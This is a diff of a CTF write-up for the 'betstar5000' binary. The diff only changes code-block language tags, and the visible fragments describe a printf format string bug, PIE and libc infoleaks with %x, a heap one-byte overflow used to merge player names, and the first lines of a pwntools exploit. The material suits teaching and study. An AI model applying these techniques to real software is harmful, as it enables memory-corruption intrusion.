@@ -4,7 +4,7 @@ This writeup goes out to noopnoop, for his eternal love of format strings.
 
 Let's take a look at the binary / libc:
 
-```
+```console
 $    ./betstar5000
 Welcome to the ultimate betting service.
 Enter the amount of players: 1
@@ -44,7 +44,7 @@ We can see that the binary has `pie`, `NX`, and a stack canary. It is a `32` bit
 
 When we take a look at the function at pie offset `0xb17` in ghidra (although Ghidra rebases it to `0x10b17`) we see this:
 
-```
+```c
 /* WARNING: Function: __i686.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
 void basicallyMain(void)
@@ -99,7 +99,7 @@ void basicallyMain(void)
 
 So we can see some things here regarding this binary. We see that it allocates some space, and allows us to write user names to it. We also see that that there is some sort of jump function happening at the end. While I reversed this, I found several different bugs. In addition to that there was a lot of functionality in the binary that I didn't reverse out fully. However due to the constraints of code, I only ended up using a single bug. That bug was within the function responsible for playing a game, at pie offset `0x831` (ghidra rebased it to `0x10831`):
 
-```
+```c
 
 /* WARNING: Function: __i686.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
 
@@ -157,7 +157,7 @@ void playRound(int param_1)
 
 We can see that there is a format string bug here:
 
-```
+```c
   printf(acStack80);
 ```
 
@@ -171,7 +171,7 @@ So my exploit worked like this. First off we get `pie` and `libc` infoleaks, so 
 
 Let's take a look at how we are doing the `PIE` and `LIBC` infoleak.
 
-```
+```gdb
 gef➤  pie b *0x9df
 gef➤  pie run
 Stopped due to shared library event (no libraries added or removed)
@@ -252,7 +252,7 @@ And the winner is *drumroll*: 5655605c.f7fb55c0
 
 So we can see the addresses the we leaked are `0x5655605c` (the string in the binary `And the winner is *drumroll*: `), and `0xf7fb55c0` (libc `STDIN`). Notice how these addresses are the first two addresses we can leak with the fmt string `%x.%x`, and that these two addresses are the first two values below our format string `%x.%x`, which is at the top of the stack. This isn't a coincidence. We can reliably use this as a remote infoleak for both `PIE` and `libc`. We can find the offsets from those values to the libc/pie bases like this:
 
-```
+```gdb
 gef➤  vmmap
 Start      End        Offset     Perm Path
 0x56555000 0x56557000 0x00000000 r-x /home/guyinatuxedo/Desktop/betstar/betstar5000
@@ -274,7 +274,7 @@ Start      End        Offset     Perm Path
 
 A bit of python math:
 
-```
+```pycon
 >>> hex(0x5655605c - 0x56555000)
 '0x105c'
 >>> hex(0xf7fb55c0 - 0xf7ddd000)
@@ -287,7 +287,7 @@ Now that we have the infoleaks, the only thing left is to set up the format stri
 
 First let's take a look at the memory layout of the names, so we can see exactly what the issues are:
 
-```
+```gdb
 gef➤  r
 Starting program: /home/guyinatuxedo/Desktop/betstar/betstar5000
 Welcome to the ultimate betting service.
@@ -359,7 +359,7 @@ Player 44444444444444444 currently has 0 points.
 
 When we take a look at the actual memory layout of the names:
 
-```
+```gdb
 gef➤  search-pattern 0000000
 [+] Searching '0000000' in memory
 [+] In '[heap]'(0x56558000-0x5657a000), permission=rw-
@@ -382,7 +382,7 @@ gef➤  x/40x 0x565589b0
 
 So our names are stored in the heap (however the name that is being passed to the format string is copied to the stack prior to the call). So for our names, we can see that the space allocated for them is overflowed. Then when we allocate additional heap chunks the header essentially truncates the name after `12` bytes. So every name before our last name is only `12` bytes long. We will merge the strings using the edit player name functionality. First off we will edit one name with a value of `17` non-null bytes. This will overflow 1 byte into the next name. Now all of the names are null terminated, and when we do this, the null terminator will end up on the second byte of the name which is being overflowed.
 
-```
+```c
 gef➤  c
 Continuing.
 4
@@ -466,7 +466,7 @@ gef➤  x/40x 0x565589b0
 
 Now to get rid of the null byte, we will just update the overflowed name with a new value. This will get rid of the null byte, and effectively merge the two names.
 
-```
+```gdb
 gef➤  x/40x 0x565589b0
 0x565589b0:    0x00000000    0x00000000    0x00000000    0x00000011
 0x565589c0:    0x30303030    0x30303030    0x30303030    0x00000011
@@ -519,7 +519,7 @@ Now when we execute the format string, we first calculate the got address of `at
 
 Now for where the start of our input will end up on the stack with relation to the format string, we can see specifically that they will end up at spot `19`:
 
-```
+```gdb
 gef➤  pie b *0x9df
 gef➤  pie run
 Stopped due to shared library event (no libraries added or removed)
@@ -597,7 +597,7 @@ gef➤
 
 Now for our format string spot `1` is `0xffffd024`. Spot `19` would be `0xffffd024 + (4*18) = 0xffffd06c`:
 
-```
+```gdb
 gef➤  x/w 0xffffd06c
 0xffffd06c:    0x30303030
 gef➤  c
@@ -616,7 +616,7 @@ Also one last thing. I didn't reverse out the functionality for the guessing gam
 
 With that, we can put together the following exploit:
 
-```
+```python
 from pwn import *
 
 #target = process("./betstar5000")
@@ -711,7 +711,7 @@ target.interactive()
 
 When we run it:
 
-```
+```console
 $    python exploit.py
 [+] Opening connection to 13.53.69.114 on port 50000: Done
 [*] '/Hackery/watev/betstar/betstar5000'
@@ -796,7 +796,7 @@ Amount of players playing this round: Each player makes a bet between 0 -> 100, 
 
 After all the bytes that get printed for the fmt string:
 
-```
+```console
                       f7f5f5c0
 1. Play a round
 2. View scores
